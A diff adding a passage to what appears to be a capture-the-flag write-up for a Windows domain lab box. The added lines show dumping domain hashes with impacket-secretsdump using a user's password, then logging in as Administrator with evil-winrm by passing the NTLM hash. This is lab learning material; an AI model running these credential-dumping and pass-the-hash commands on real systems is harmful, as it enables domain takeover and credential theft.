@@ -138,6 +138,25 @@ It works! and if we run the below, we see the user is DOMAIN ADMIN!
 
 ![domainadmin](/images/domainadmin.jpg)
 
+I found the system.txt within 'C:\Users\Administrator\Desktop', but the file itself is not readable by the user. We can use secretsdump to try dumping the Administrator account.
+
+```
+impacket-secretsdump VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@10.10.31.71
+```
+
+We found all hashes but what we really want is the Administrator one that we got here.
+
+![admin](/images/admin.jpg)
+
+We don't need to crack the hash, we can just use it with Evil-WinRM:
+
+```
+evil-winrm -i 10.10.31.71 -u 'Administrator' -H 'c2597747aa5e43022a3a3049a3c3b09d'
+```
+
+It worked! And now we can read the system.txt file to grab the system flag.
+
+
 
 
 
